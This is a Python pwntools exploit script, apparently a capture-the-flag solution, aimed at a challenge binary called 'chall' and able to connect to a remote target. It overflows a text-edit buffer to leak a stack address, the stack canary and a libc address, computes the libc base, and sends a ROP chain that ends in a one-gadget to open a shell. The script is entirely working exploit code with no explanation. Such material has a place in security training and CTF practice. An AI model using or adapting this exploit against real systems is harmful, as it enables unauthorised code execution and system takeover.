from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h"]

def st():
    if args.GDB:
        return gdb.debug(exe, gdbscript=gdbscript, api=True)

    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])

    return process(exe)

exe = '../src/chall'
elf = context.binary = ELF(exe)
libc = elf.libc

gdbscript = '''
#b *(vuln_edit_text + 493)
c
'''

def i2b(val: int | bytes):
    if type(val) is bytes:
        return val

    return str(val).encode()

def send_date(day: int | bytes, month: int | bytes, year: int | bytes):
    io.sendlineafter(b"):", i2b(day) + b"/" + i2b(month) + b"/" + i2b(year))

def create(idx: int, size: str, content: bytes):
    io.sendlineafter(b">", i2b(0))
    io.sendlineafter(b">", i2b(idx))
    io.sendlineafter(b"]:", size.encode())
    io.sendafter(b"text:", content)
    io.sendlineafter(b"]:", b'y')

def edit(idx: int, content: bytes, confirm: str = "y"):
    io.sendlineafter(b">", i2b(2))
    io.sendlineafter(b">", i2b(idx))
    io.sendlineafter(b"text:", content)
    io.sendline(confirm.encode())


io = st()
if __name__ == "__main__":
  create(0, 'l', b"A"*0xff)
  send_date(0x44, 0x44, 0xdeadbeef)
  edit(0, b"X"*0x100, confirm='n')
  _stack_leak = io.recvuntil(b"Keep", drop=True).split(b'\n')[2]
  stack_leak = (u64(_stack_leak.ljust(8, b'\x00')) << 8)
  log.success(f" stack @ {hex(stack_leak)}")

  io.sendlineafter(b"text:", b"X"*0x108)
  _canary_leak = io.recvuntil(b"Keep", drop=True).split(b'\n')
  canary_leak = u64(_canary_leak[2][:7].rjust(8, b'\x00'))
  log.success(f" canary @ {hex(canary_leak)}")

  io.sendline(b'n')
  io.sendlineafter(b"text:", b"X"*0x208)
  _libc_start_main = io.recvuntil(b"Keep", drop=True).split(b'\n')
  print(_libc_start_main)
  libc_start_main_leak = u64(_libc_start_main[2].ljust(8, b'\x00')) << 8
  log.success(f" libc_start_main @ {hex(libc_start_main_leak)}")

  libc.address = libc_start_main_leak - 0x27200
  log.success(f"Libc @ {hex(libc.address)}")

  one_gad = libc.address + 0xd4f5f
  ret = libc.address + 0x00000000000270c2
  pop_r13_ret = libc.address + 0x0000000000029770 #: pop r13 ; ret
  pop_r12_ret = libc.address + 0x00000000000273a9 #: pop r12 ; ret
  pop_rdi_ret = libc.address + 0x0000000000027725 #: pop rdi ; ret
  pop_rbx_ret = libc.address + 0x00000000000586d4 #: pop rbx ; ret
  pop_rcx_ret = libc.address + 0x00000000000a876e #: pop rcx ; ret


  payload = b'\x00' * 0x108 + \
              p64(canary_leak) + \
              p64(stack_leak) + \
              p64(pop_rdi_ret) + \
              p64(0x0) + \
              p64(pop_r13_ret) + \
              p64(0x0) + \
              p64(one_gad)

  io.sendline(b'n')
  io.sendlineafter(b"text:", payload)
  io.sendline(b'y')

  log.critical("Popping shell...")
  io.interactive()
  io.close()
